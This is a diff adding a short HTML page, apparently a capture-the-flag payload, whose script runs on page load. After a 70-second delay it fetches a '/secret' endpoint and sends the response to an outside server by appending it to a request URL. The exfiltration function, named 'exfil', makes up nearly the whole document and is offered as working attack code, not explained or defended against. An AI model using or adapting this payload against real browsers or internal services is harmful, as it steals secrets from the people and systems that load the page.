@@ -1,0 +1,21 @@
+<html>
+<body onload="exfil();">
+Stay a while and listen. -- Deckard Cain
+<script>
+function exfil(ip) {
+    // Wait 70s
+    setTimeout(function() {
+        var xmlhttp = new XMLHttpRequest();
+        // http://127.0.0.1:8080/secret
+        xmlhttp.open("GET", "http://0xbu.com:8080/secret", false);
+        xmlhttp.send();
+        var data = xmlhttp.responseText;
+        // Cors enabled on this domain
+        xmlhttp.open("GET", "http://robo.eugenekolo.com:3000/hi"+data, false);
+        xmlhttp.send();
+    }, 70000);
+}
+</script>
+</body>
+</html>
+
